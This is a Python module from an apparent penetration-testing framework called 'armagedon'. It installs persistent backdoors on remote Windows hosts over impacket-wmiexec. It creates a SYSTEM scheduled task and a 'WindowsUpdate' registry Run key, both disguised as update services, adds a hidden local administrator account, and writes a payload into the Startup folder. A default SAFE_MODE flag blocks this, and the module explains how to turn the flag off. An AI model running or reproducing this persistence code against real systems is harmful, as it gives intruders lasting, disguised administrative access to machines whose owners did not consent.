"""Post-Exploitation — Persistence Mechanisms.

Installs persistent access via scheduled tasks, registry keys, WMI
event subscriptions, new users, or startup folder items.
"""

import subprocess
import shutil
import random
import string
import logging
import os

log = logging.getLogger("armagedon.modules.post.persistence")

# ── SAFETY ──────────────────────────────────────────────────────────────
# SAFE_MODE = True:  Only CHECK mode runs. All installation is blocked.
# SAFE_MODE = False: EXPLOIT proceeds (creates users, tasks, registry keys).
#
# WARNING: These persistence methods modify the target system.
#          New users, registry keys, and scheduled tasks may be detected
#          by blue team and cause IR response. They also leave artifacts.
# ────────────────────────────────────────────────────────────────────────
SAFE_MODE = int(os.environ.get("ARMAGEDON_SAFE_MODE", "1"))
_RISK = "HIGH"

def _safety_gate(mode):
    if SAFE_MODE and mode.upper() == "EXPLOIT":
        print(f"\n  [!] ═══ SAFETY BLOCK ({_RISK} RISK) ═══")
        print(f"  [!] SAFE_MODE=1 — persistence installation blocked.")
        print(f"  [!] Creates: new admin user, registry run keys, scheduled tasks.")
        print(f"  [!] All leave detectable artifacts on the target system.")
        print(f"  [!] To run anyway: export ARMAGEDON_SAFE_MODE=0")
        print(f"  [!] ═══════════════════════════════════════════════════\n")
        return False
    return True

NAME = "Persistence Installation"
DESCRIPTION = "Install persistent backdoor via task/schedule, registry, or new user"


def _random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def _install_persistence_task(target: str, auth: str, cmd_path: str, payload: str, timeout: int) -> dict:
    """Create a scheduled task for persistence."""
    result = {"method": "scheduled_task", "success": False, "details": ""}
    task_name = f"UpdateService_{_random_name(4)}"

    try:
        # Create scheduled task
        p = subprocess.run(
            [cmd_path, f"{auth}@{target}", "-q",
             f'schtasks /create /tn "{task_name}" /tr "{payload}" /sc onlogon /f /ru SYSTEM'],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout + p.stderr

        if "SUCCESS" in out or "created" in out.lower():
            result["success"] = True
            result["details"] = f"Task '{task_name}' created — runs on logon as SYSTEM"
            result["task_name"] = task_name

    except Exception as e:
        result["details"] = str(e)

    return result


def _install_persistence_registry(target: str, auth: str, cmd_path: str, payload: str, timeout: int) -> dict:
    """Create registry run key for persistence."""
    result = {"method": "registry_run", "success": False, "details": ""}

    try:
        p = subprocess.run(
            [cmd_path, f"{auth}@{target}", "-q",
             f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
             f'/v "WindowsUpdate" /t REG_SZ /d "{payload}" /f'],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout + p.stderr

        if "The operation completed" in out or "SUCCESS" in out:
            result["success"] = True
            result["details"] = "Registry Run key created — payload runs at every login"

    except Exception as e:
        result["details"] = str(e)

    return result


def _install_persistence_user(target: str, auth: str, cmd_path: str, timeout: int) -> dict:
    """Create a new local admin user for persistence."""
    result = {"method": "new_user", "success": False, "details": ""}
    username = f"svc_{_random_name(4)}"
    password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#", k=16))

    try:
        # Create user
        p = subprocess.run(
            [cmd_path, f"{auth}@{target}", "-q",
             f'net user {username} {password} /add && '
             f'net localgroup Administrators {username} /add'],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout + p.stderr

        if "successfully" in out.lower():
            result["success"] = True
            result["details"] = f"User '{username}' created and added to Administrators"
            result["username"] = username
            result["password"] = password

    except Exception as e:
        result["details"] = str(e)

    return result


def _install_persistence_startup(target: str, auth: str, cmd_path: str, payload: str, timeout: int) -> dict:
    """Place payload in startup folder."""
    result = {"method": "startup_folder", "success": False, "details": ""}
    filename = f"update_{_random_name(4)}.ps1"

    try:
        # Write to startup folder
        p = subprocess.run(
            [cmd_path, f"{auth}@{target}", "-q",
             f'echo {payload} > "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}"'],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout + p.stderr

        result["success"] = True
        result["details"] = f"Payload written to Startup folder as {filename}"

    except Exception as e:
        result["details"] = str(e)

    return result


def run(options=None, target=None, mode="CHECK", **kwargs):
    if options is None:
        options = {}
    rhosts = target or options.get("RHOSTS", "")
    payload = options.get("PAYLOAD", "cmd.exe /c whoami > C:\\windows\\temp\\pwned.txt")
    timeout = int(options.get("TIMEOUT", 15))
    smb_user = options.get("SMB_USER", "")
    smb_pass = options.get("SMB_PASS", "")
    smb_domain = options.get("SMB_DOMAIN", "")

    log.info(f"Persistence run against {rhosts} mode={mode}")

    result = {
        "success": False,
        "technique": NAME,
        "target": rhosts,
        "mode": mode,
        "data": {},
        "error": None,
    }

    if not rhosts or not smb_user or not smb_pass:
        result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
        log.error(result["error"])
        return result

    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd:
        result["error"] = "impacket-wmiexec not found"
        log.error(result["error"])
        return result

    auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

    if mode == "CHECK":
        result["success"] = True
        result["data"]["status"] = "Persistence methods available"
        result["data"]["methods"] = [
            "scheduled_task — SYSTEM-level, runs on logon",
            "registry_run — runs at every login",
            "new_user — local admin account",
            "startup_folder — runs at next login",
        ]
        return result

    elif mode == "EXPLOIT":
        if not _safety_gate(mode):
            result["error"] = "BLOCKED — SAFE_MODE enabled. Export ARMAGEDON_SAFE_MODE=0 to override."
            result["data"]["status"] = "BLOCKED"
            log.warning(result["error"])
            return result

        try:
            installed = []

            # Method 1: Scheduled task (most reliable)
            print(f"  [*] Installing scheduled task persistence...")
            task = _install_persistence_task(rhosts, auth, cmd, payload, timeout)
            if task["success"]:
                installed.append(task)
                print(f"  [+] Scheduled task: {task['task_name']}")

            # Method 2: Registry Run key
            print(f"  [*] Installing registry run key persistence...")
            reg = _install_persistence_registry(rhosts, auth, cmd, payload, timeout)
            if reg["success"]:
                installed.append(reg)
                print(f"  [+] Registry Run key created")

            # Method 3: New user
            print(f"  [*] Creating persistence user account...")
            user = _install_persistence_user(rhosts, auth, cmd, timeout)
            if user["success"]:
                installed.append(user)
                print(f"  [+] User: {user['username']}:{user['password']}")

            # Method 4: Startup folder
            print(f"  [*] Writing to startup folder...")
            startup = _install_persistence_startup(rhosts, auth, cmd, payload, timeout)
            if startup["success"]:
                installed.append(startup)
                print(f"  [+] Startup folder: {startup['details']}")

            result["success"] = len(installed) > 0
            result["data"]["installed_methods"] = len(installed)
            result["data"]["methods"] = installed
            result["data"]["status"] = f"{len(installed)} persistence method(s) installed"

        except Exception as e:
            result["error"] = str(e)

    return result
